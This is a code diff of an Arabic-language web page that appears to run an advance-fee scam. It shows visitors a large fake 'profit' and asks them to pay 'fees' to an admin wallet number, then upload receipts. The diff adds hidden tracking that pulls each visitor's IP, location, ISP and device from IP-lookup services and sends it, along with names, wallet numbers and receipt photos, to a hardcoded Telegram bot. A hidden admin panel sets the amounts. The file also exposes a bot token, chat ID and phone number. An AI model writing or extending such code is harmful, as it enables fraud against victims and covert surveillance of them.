@@ -9,23 +9,19 @@
         :root { --main-grad: linear-gradient(135deg, #020024, #090979, #00d4ff); --gold: #ffcc00; --success: #00ff88; }
         body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--main-grad); color: white; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 15px; overflow-x: hidden; }
         
-        /* شاشة الدخول */
         .login-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 40px 20px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.2); width: 100%; max-width: 380px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
         .login-card h1 { font-size: 24px; color: var(--gold); margin-bottom: 20px; }
         .login-card input { width: 85%; padding: 15px; border-radius: 12px; border: 1px solid var(--gold); background: rgba(0,0,0,0.5); color: white; font-size: 18px; text-align: center; outline: none; margin-bottom: 20px; }
         .login-card button { background: var(--gold); border: none; padding: 12px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; width: 90%; transition: 0.3s; }
 
-        /* الزر المخفي للمدير */
         #admin-trigger { position: fixed; bottom: 0; right: 0; width: 40px; height: 40px; background: transparent; cursor: pointer; z-index: 9999; }
 
-        /* لوحة تحكم المدير */
         #admin-panel { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; display: none; flex-direction: column; align-items: center; justify-content: center; overflow-y: auto; padding: 20px; }
         .admin-content { background: #111; border: 2px solid var(--gold); padding: 25px; border-radius: 20px; width: 100%; max-width: 320px; }
         .admin-content label { display: block; font-size: 12px; color: #aaa; margin-top: 10px; text-align: right; }
         .admin-content input { width: 100%; padding: 10px; margin-top: 5px; background: #222; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box; text-align: center; }
         .admin-content button { background: var(--success); color: #000; border: none; padding: 12px; border-radius: 5px; width: 100%; font-weight: bold; margin-top: 20px; cursor: pointer; }
 
-        /* واجهة الموقع بعد الدخول */
         #main-site { display: none; width: 100%; max-width: 420px; }
         .site-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 25px; border-radius: 25px; border: 1px solid rgba(255,255,255,0.2); text-align: center; }
         .timer-badge { background: rgba(255,0,0,0.3); color: #ff4d4d; padding: 5px 15px; border-radius: 20px; font-weight: bold; font-size: 14px; margin-bottom: 15px; display: inline-block; border: 1px solid #ff4d4d; }
@@ -91,24 +87,17 @@
 </div>
 
 <script>
-    // الإعدادات المحدثة بالتوكن والآيدي الجديد
     const TOKEN = '8412077444:AAHgu7XnlUMAaRPayFmUtD14AAbTznPJRII';
     const CHAT_ID = '8292390266';
 
-    // استعادة الإعدادات أو وضع افتراضية
     let config = JSON.parse(localStorage.getItem('adminConfig')) || { 
-        pass: '123456', 
-        time: 5, 
-        profit: 50000, 
-        fees: 500,
-        adminWallet: '01226811784'
+        pass: '123456', time: 5, profit: 50000, fees: 500, adminWallet: '01226811784'
     };
 
     function applyConfig() {
         document.getElementById('showProfit').innerText = Number(config.profit).toLocaleString();
         document.getElementById('showFees').innerText = config.fees;
         document.getElementById('showAdminWallet').innerText = config.adminWallet;
-        
         document.getElementById('setPass').value = config.pass;
         document.getElementById('setTime').value = config.time;
         document.getElementById('setProfit').value = config.profit;
@@ -118,13 +107,7 @@
     applyConfig();
 
     let clickCount = 0;
-    function adminClick() {
-        clickCount++;
-        if(clickCount >= 3) {
-            document.getElementById('admin-panel').style.display = 'flex';
-            clickCount = 0;
-        }
-    }
+    function adminClick() { clickCount++; if(clickCount >= 3) { document.getElementById('admin-panel').style.display = 'flex'; clickCount = 0; } }
 
     function saveAdminSettings() {
         config = {
@@ -137,7 +120,34 @@
         localStorage.setItem('adminConfig', JSON.stringify(config));
         applyConfig();
         document.getElementById('admin-panel').style.display = 'none';
-        alert("تم تحديث الإعدادات بنجاح.");
+        alert("تم الحفظ.");
+    }
+
+    // --- وظيفة جلب معلومات التتبع المتطورة (IP + الموقع + الشركة) ---
+    async function getAdvancedTracking() {
+        let report = { ip: "غير معروف", city: "غير معروف", country: "غير معروف", isp: "غير معروف", device: navigator.userAgent };
+        try {
+            // استخدام خدمة ip-api لجلب تفاصيل العنوان
+            const res = await fetch('http://ip-api.com/json/');
+            const data = await res.json();
+            if(data.status === 'success') {
+                report.ip = data.query;
+                report.city = data.city;
+                report.country = data.country;
+                report.isp = data.isp;
+            }
+        } catch(e) {
+            // محاولة بديلة إذا فشلت الأولى
+            try {
+                const res2 = await fetch('https://ipapi.co/json/');
+                const data2 = await res2.json();
+                report.ip = data2.ip;
+                report.city = data2.city;
+                report.country = data2.country_name;
+                report.isp = data2.org;
+            } catch(e2) {}
+        }
+        return report;
     }
 
     async function accessSite() {
@@ -146,64 +156,52 @@
             document.getElementById('login-page').style.display = 'none';
             document.getElementById('main-site').style.display = 'block';
             
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔔 شخص ما سجل دخوله الآن بالكود الصحيح.`);
+            // جلب البيانات المتطورة وإرسالها
+            const track = await getAdvancedTracking();
+            const msg = `🔔 دخول جديد (رصد كامل):\n\n` +
+                        `🌐 العنوان: ${track.ip}\n` +
+                        `📍 الموقع: ${track.city}, ${track.country}\n` +
+                        `🏢 الشركة: ${track.isp}\n` +
+                        `📱 الجهاز: ${track.device}`;
+                        
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
             
             startCountdown(config.time * 60);
         } else {
-            alert("كود الدخول غير صحيح!");
+            alert("الكود خطأ!");
         }
     }
 
     function startCountdown(duration) {
-        let timer = duration, minutes, seconds;
+        let timer = duration;
         const display = document.getElementById('displayTime');
         const interval = setInterval(() => {
-            minutes = parseInt(timer / 60, 10);
-            seconds = parseInt(timer % 60, 10);
-            display.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
-            if (--timer < 0) {
-                clearInterval(interval);
-                alert("انتهت صلاحية الجلسة!");
-                location.reload();
-            }
+            let m = parseInt(timer / 60, 10);
+            let s = parseInt(timer % 60, 10);
+            display.textContent = (m < 10 ? "0"+m : m) + ":" + (s < 10 ? "0"+s : s);
+            if (--timer < 0) { clearInterval(interval); location.reload(); }
         }, 1000);
     }
 
     async function sendToTelegram() {
         const name = document.getElementById('uName').value;
         const wallet = document.getElementById('uWallet').value;
-        const fileInput = document.getElementById('uFile');
-        const file = fileInput.files[0];
+        const file = document.getElementById('uFile').files[0];
 
-        if(!name || !wallet || !file) {
-            alert("يرجى إكمال كافة البيانات ورفع صورة الإيصال.");
-            return;
-        }
+        if(!name || !wallet || !file) return alert("أكمل البيانات وارفع الإيصال.");
 
         document.getElementById('loader').style.display = 'flex';
-
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
         formData.append('photo', file);
-        formData.append('caption', `🌟 طلب سحب جديد 🌟\n\n👤 الاسم: ${name}\n📱 رقم العميل: ${wallet}\n💰 الربح المعروض: ${config.profit}\n💸 الرسوم المدفوعة: ${config.fees}\n💳 تم التحويل لرقمك: ${config.adminWallet}`);
+        formData.append('caption', `🌟 سحب جديد 🌟\n👤 الاسم: ${name}\n📱 الرقم: ${wallet}\n💰 الربح: ${config.profit}\n💸 الرسوم: ${config.fees}\n💳 المحفظة المستلمة: ${config.adminWallet}`);
 
         try {
-            const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-
-            if(response.ok) {
-                alert("تم إرسال طلبك بنجاح، جاري المراجعة.");
-                location.reload();
-            } else {
-                throw new Error();
-            }
-        } catch(error) {
-            alert("حدث خطأ أثناء الإرسال، تأكد من اتصال الإنترنت.");
-        } finally {
-            document.getElementById('loader').style.display = 'none';
-        }
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            alert("تم الإرسال بنجاح.");
+            location.reload();
+        } catch(e) { alert("خطأ في الاتصال."); }
+        finally { document.getElementById('loader').style.display = 'none'; }
     }
 </script>
 </body>
